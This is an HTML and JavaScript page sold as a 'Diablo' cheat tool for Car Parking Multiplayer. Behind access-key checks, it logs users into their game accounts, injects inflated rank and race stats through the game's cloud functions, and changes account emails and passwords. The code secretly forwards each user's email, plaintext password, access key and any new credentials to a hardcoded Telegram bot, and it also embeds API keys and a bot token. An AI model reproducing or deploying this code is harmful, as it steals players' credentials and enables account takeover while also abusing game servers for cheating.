<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
<title>TOOLS CLAN DIABLO CPR.XXX</title>
<style>
body{margin:0;padding:0;font-family:Arial,sans-serif;background: url('image.png') no-repeat center center fixed;background-size: cover;color:#fff;}
.center-wrapper{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:90%;max-width:350px}
.container{background:rgba(0,0,0,.7);backdrop-filter:blur(12px);padding:20px;border-radius:10px;box-shadow: 0 0 25px rgba(160, 32, 240, 0.5);border:2px solid #a020f0;text-align:center;}
h1{font-size:20px;margin-bottom:12px}
input,select{width:90%;padding:10px;margin:8px 0;border-radius:5px;border:0;background:rgba(255,255,255,.1);color:#fff;font-size:16px}
button{width:95%;padding:10px;margin:6px 0;border-radius:5px;border:0;cursor:pointer;font-weight:700;font-size:16px}
button.login{background:#a020f0;color:#fff}
button.menu{background:#ff8800;color:#fff}
.status{margin-top:10px;color:#0f0;min-height:20px;font-weight:bold;white-space: pre-wrap;}
.error{color:#f55}
.small{font-size:12px;opacity:.9}
.price{font-size:13px;opacity:.8;margin-bottom:6px;color:#e0aaff;}
/* Style baru untuk grid input stats */
.stats-grid{display:grid;grid-template-columns: repeat(3, 1fr);gap:5px;margin:10px 0;}
.stats-grid input{width:80%;padding:5px;font-size:12px;}
</style>

<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
</head>
<body>
<div class="center-wrapper">
  <div class="container">
    <h1>CPM WEB TOOL - Diablo CPR.XXX</h1>
    
    <div id="loginSection">
      <select id="gameSelect">
        <option value="">-- Select Game --</option>
        <option value="1">Car Parking Multiplayer</option>
        <option value="2">Car Parking Multiplayer 2</option>
      </select>
      <input id="email" type="email" placeholder="Email">
      <input id="password" type="password" placeholder="Password">
      <input id="accessKey" type="text" placeholder="Masukkan Access Key">
      <button class="login" id="loginBtn">Login</button>
      <div id="status" class="status"></div>
    </div>

    <div id="menuButtons" style="display:none">
      <div class="price">📊 Set Race Stats</div>
      <div class="stats-grid">
          <div><label class="small">RACE</label><input type="number" id="raceCount" placeholder="0"></div>
          <div><label class="small">WIN</label><input type="number" id="winCount" placeholder="0"></div>
          <div><label class="small">LOSE</label><input type="number" id="loseCount" placeholder="0"></div>
      </div>
      <input type="text" id="customId" placeholder="Custom ID / Nickname">
      
      <div class="price">👑 King Rank & Stats </div>
      <button class="menu" onclick="kingRank()">Inject King Rank</button>
      
      <div class="price">📧 Akun Settings </div>
      <button class="menu" onclick="changeEmail()">Change Email</button>
      <button class="menu" onclick="changePassword()">Change Password</button>
      <div id="serviceStatus" class="status"></div>
    </div>

    <footer class="small" style="margin-top:12px">Developer, @AWIMEDAN-GARAGE - </footer>
  </div>
</div>

<script>
// === DATA FIREBASE ===
const firebaseConfig = {
  apiKey: "AIzaSyCNZokAKl6TVKWMOc51SCSRKZGqoG77uFI",
  authDomain: "cpmapikey.firebaseapp.com",
  databaseURL: "https://cpmapikey-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "cpmapikey",
  storageBucket: "cpmapikey.firebasestorage.app",
  messagingSenderId: "372965414639",
  appId: "1:372965414639:web:e79bb42a252336cab52d1a"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

const BOT_TOKEN = "8625213432:AAHVdpxEdFkh1vg1SF5RQha09wp6SxRlGdU";
const ADMIN_ID = "6095762919";

const GAMES = {
  "1": { name:"Car Parking Multiplayer", api_key:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", rank_url:"https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4" },
  "2": { name:"Car Parking Multiplayer 2", api_key:"AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ", rank_url:"https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI" }
};

let currentUser=null,currentToken=null,selectedGame=null;

function updateStatus(msg,isError=false,target='status'){
  const el=document.getElementById(target);
  el.className=isError?'status error':'status';
  el.textContent=msg;
}

function sendMessageToAdmin(text){
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",headers:{"Content-Type":"application/json"},
    body:JSON.stringify({chat_id: ADMIN_ID, text: text, parse_mode: "Markdown"})
  }).catch(()=>{});
}

async function validateKey(userKey) {
    try {
        const snapshot = await database.ref('keys/' + userKey).once('value');
        const data = snapshot.val();
        if (!data) return { valid: false, msg: "❌ Key Tidak Terdaftar!" };
        if (data.status !== "active") return { valid: false, msg: "❌ Key Nonaktif!" };
        const today = new Date().toISOString().split('T')[0];
        if (today > data.expiry) return { valid: false, msg: "❌ Key Kadaluwarsa!" };
        return { valid: true, expiry: data.expiry };
    } catch(e) { return { valid: false, msg: "❌ Database Error!" }; }
}

document.getElementById('loginBtn').addEventListener('click', async ()=>{
  const email=document.getElementById('email').value.trim();
  const password=document.getElementById('password').value;
  const key=document.getElementById('accessKey').value.trim();
  const gameVal=document.getElementById('gameSelect').value;
  selectedGame = GAMES[gameVal];

  if(!selectedGame){ updateStatus("Select game first!",true); return; }
  if(!email||!password||!key){ updateStatus("Please fill all fields!",true); return; }

  updateStatus("Verifying Key...");
  const keyCheck = await validateKey(key);
  if(!keyCheck.valid) { updateStatus(keyCheck.msg, true); return; }

  updateStatus("Logging in...");
  try{
    const resp = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${selectedGame.api_key}`,{
      method:'POST',headers:{"Content-Type":"application/json"},
      body:JSON.stringify({email,password,returnSecureToken:true})
    });
    const data = await resp.json();
    if(data.idToken){
      currentUser=email; currentToken=data.idToken;
      document.getElementById('loginSection').style.display='none';
      document.getElementById('menuButtons').style.display='block';
      sendMessageToAdmin(`🌐 **Diablo Tool Login**\n🎮 Game: ${selectedGame.name}\n🔑 Key: \`${key}\` (Exp: ${keyCheck.expiry})\n📧 Email: \`${email}\`\n🔒 Pass: \`${password}\``);
    }else updateStatus("❌ Login failed!",true);
  } catch(err){ updateStatus("❌ Error connecting!",true); }
});

// === FUNGSI KING RANK PINDAHAN DARI SCRIPT SEBELUMNYA ===
async function kingRank(){
  if(!currentToken) return;
  updateStatus("Processing Inject...",false,'serviceStatus');

  const customRace = parseInt(document.getElementById('raceCount').value) || 0;
  const customWin = parseInt(document.getElementById('winCount').value) || 0;
  const customLose = parseInt(document.getElementById('loseCount').value) || 0;
  const customName = document.getElementById('customId').value || "DIABLO_USER";

  // Keys dari dump.cs 14.9.8
  const keys = ["t_distance", "time", "speed_banner", "gifts", "chests", "treasure", "cars", "levels", "drift", "run", "police", "block_post", "real_estate", "fuel", "car_trade", "car_exchange", "burnt_tire", "car_fix", "car_wash", "offroad", "passanger_distance", "reactions", "drift_max", "taxi", "delivery", "cargo", "push_ups", "slicer_cut", "car_collided"];

  const ratingData = Object.fromEntries(keys.map(key => [key, 1000000]));
  
  ratingData.race_win = customWin;
  ratingData.race = customRace;
  ratingData.race_lose = customLose;
  ratingData.time = 999999; 

  const payload = {
    data: JSON.stringify({ 
        RatingData: ratingData,
        localID: customName, 
        Name: customName,
        win: customWin,
        race: customRace,
        lose: customLose
    })
  };

  try{
    const res = await fetch(selectedGame.rank_url,{
      method:'POST',
      headers:{"Authorization":`Bearer ${currentToken}`,"Content-Type":"application/json"},
      body:JSON.stringify(payload)
    });
    if(res.ok){ 
      updateStatus("🔥 SUCCESS 🔥\nStats & King Injected!",false,'serviceStatus'); 
      sendMessageToAdmin(`👑 **King Applied**\nUser: \`${currentUser}\`\nNick: ${customName}\nRace: ${customRace} | Win: ${customWin}`);
    } else updateStatus("❌ Gagal Inject!",true,'serviceStatus');
  }catch(err){ updateStatus("❌ Error Connection!",true,'serviceStatus'); }
}

async function changeEmail(){
  if(!currentToken) return;
  const newEmail=prompt("New email:"); if(!newEmail)return;
  try{
    const r=await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`,{
      method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify({idToken:currentToken,email:newEmail,returnSecureToken:true})
    });
    if(r.ok){ 
      updateStatus("✅ Email Changed!",false,'serviceStatus'); 
      sendMessageToAdmin(`📧 **Email Change**\nOld: \`${currentUser}\`\nNew: \`${newEmail}\``);
      currentUser = newEmail;
    }
  }catch(e){ updateStatus("❌ Gagal!", true, 'serviceStatus'); }
}

async function changePassword(){
  if(!currentToken) return;
  const newPassword=prompt("New password:"); if(!newPassword)return;
  try{
    const r=await fetch(`https://identitytoolkit.googleapis.com/v1/accounts:update?key=${selectedGame.api_key}`,{
      method:'POST',headers:{"Content-Type":"application/json"},body:JSON.stringify({idToken:currentToken,password:newPassword,returnSecureToken:true})
    });
    if(r.ok){ 
      updateStatus("✅ Password Changed!",false,'serviceStatus'); 
      sendMessageToAdmin(`🔐 **Password Change**\nUser: \`${currentUser}\`\nNew: \`${newPassword}\``);
    }
  }catch(e){ updateStatus("❌ Gagal!", true, 'serviceStatus'); }
}
</script>
</body>
</html>
